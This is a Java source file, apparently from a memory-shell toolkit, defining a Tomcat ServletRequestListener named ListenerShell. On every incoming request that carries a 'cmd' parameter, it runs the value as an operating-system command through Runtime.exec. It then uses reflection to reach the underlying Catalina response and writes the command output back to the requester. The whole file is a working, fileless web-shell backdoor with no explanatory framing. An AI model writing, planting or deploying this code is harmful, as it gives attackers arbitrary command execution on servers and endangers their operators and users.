package memShell;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class ListenerShell implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        if (req.getParameter("cmd") != null){
            InputStream in = null;
            try {
                in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String out = s.hasNext()?s.next():"";
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request)requestF.get(req);
                Response response = request.getResponse();
                response.resetBuffer();
                PrintWriter writer = request.getResponse().getWriter();
                writer.write(out);
                writer.flush();
                writer.close();
            }
            catch (IOException e) {}
            catch (NoSuchFieldException e) {}
            catch (IllegalAccessException e) {}
        }
    }
}
